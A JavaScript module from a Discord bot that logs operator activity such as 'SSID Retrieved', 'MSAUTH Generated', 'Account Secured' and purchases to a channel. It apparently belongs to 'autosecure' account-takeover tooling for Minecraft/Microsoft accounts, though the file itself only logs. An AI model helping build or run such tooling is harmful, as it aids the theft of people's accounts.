    const { EmbedBuilder } = require('discord.js');
const config = require('../../config.json');
const { getMainBotClient } = require('../handlers/botHandler');

// Cache for activity channel to avoid repeated fetches
let activityChannelCache = null;
let lastChannelFetch = 0;
const CACHE_DURATION = 60000; // 1 minute

async function getActivityChannel(client) {
  // Always use main bot client for logging (autosecure bots might not have access to the log channel)
  const mainClient = getMainBotClient() || client;
  
  // Use cache if recent
  const now = Date.now();
  if (activityChannelCache && (now - lastChannelFetch) < CACHE_DURATION) {
    return activityChannelCache;
  }

  // Get activity channel from config (use log channel or create new config option)
  const channelId = config.activityLogChannel || config.log;
  if (!channelId) {
    return null;
  }

  try {
    const channel = await mainClient.channels.fetch(channelId).catch(() => null);
    if (channel) {
      activityChannelCache = channel;
      lastChannelFetch = now;
      return channel;
    }
  } catch (error) {
    console.error('[ActivityLogger] Error fetching activity channel:', error);
  }

  return null;
}

function isOwner(userId) {
  if (!config.owners || !Array.isArray(config.owners)) {
    return false;
  }
  return config.owners.some(ownerId => {
    if (typeof ownerId === 'string') {
      return /^\d{17,19}$/.test(ownerId) && ownerId === userId;
    }
    return false;
  });
}

async function logActivity(client, activityData) {
  try {
    // Don't log owner activities to reduce spam
    if (isOwner(activityData.userId)) {
      return;
    }

    // Always use main bot client for sending logs
    const mainClient = getMainBotClient() || client;
    const channel = await getActivityChannel(mainClient);
    if (!channel) {
      return;
    }

    const {
      userId,
      username,
      action,
      details = {},
      timestamp = Date.now(),
      success = true,
      error = null
    } = activityData;

    // Create embed
    const embed = new EmbedBuilder()
      .setColor(success ? 0x00ff00 : 0xff0000)
      .setTitle(`📊 User Activity: ${action}`)
      .addFields(
        { name: '👤 User', value: `${username} (${userId})`, inline: true },
        { name: '⏰ Time', value: `<t:${Math.floor(timestamp / 1000)}:R>`, inline: true },
        { name: '✅ Status', value: success ? 'Success' : 'Failed', inline: true }
      )
      .setTimestamp(timestamp);

    // Add details if provided
    if (Object.keys(details).length > 0) {
      const detailsText = Object.entries(details)
        .map(([key, value]) => {
          const displayValue = typeof value === 'object' ? JSON.stringify(value).substring(0, 100) : String(value);
          return `**${key}:** ${displayValue.length > 100 ? displayValue.substring(0, 97) + '...' : displayValue}`;
        })
        .join('\n');
      
      embed.addFields({ name: '📝 Details', value: detailsText.substring(0, 1024) || 'N/A', inline: false });
    }

    // Add error if present
    if (error) {
      embed.addFields({ 
        name: '❌ Error', 
        value: error.length > 1024 ? error.substring(0, 1021) + '...' : error, 
        inline: false 
      });
    }

    // Set footer
    embed.setFooter({ text: `Activity Log` });

    await channel.send({ embeds: [embed] }).catch(err => {
      console.error('[ActivityLogger] Failed to send activity log:', err.message);
    });

  } catch (error) {
    console.error('[ActivityLogger] Error logging activity:', error);
  }
}

// Only log essential securing operations - not general commands/buttons
async function logSSID(client, userId, username, mcname, success = true, error = null) {
  await logActivity(client, {
    userId,
    username,
    action: `SSID Retrieved`,
    details: {
      mcname: mcname || 'N/A'
    },
    success,
    error
  });
}

async function logMSAUTH(client, userId, username, email, success = true, error = null) {
  await logActivity(client, {
    userId,
    username,
    action: `MSAUTH Generated`,
    details: {
      email: email || 'N/A'
    },
    success,
    error
  });
}

async function logAccountSecure(client, userId, username, email, method, success = true, error = null) {
  await logActivity(client, {
    userId,
    username,
    action: `Account Secured: ${method}`,
    details: {
      email: email || 'N/A',
      method: method || 'Unknown'
    },
    success,
    error
  });
}

async function logTicketCreate(client, userId, username, ticketType, ticketId) {
  await logActivity(client, {
    userId,
    username,
    action: `Ticket Created: ${ticketType}`,
    details: {
      ticketType,
      ticketId,
      channel: ticketId
    },
    success: true
  });
}

async function logPurchase(client, userId, username, purchaseType, amount, success = true) {
  await logActivity(client, {
    userId,
    username,
    action: `Purchase: ${purchaseType}`,
    details: {
      type: purchaseType,
      amount: amount || 'N/A'
    },
    success
  });
}

module.exports = {
  logActivity,
  logSSID,
  logMSAUTH,
  logAccountSecure,
  logTicketCreate,
  logPurchase
};

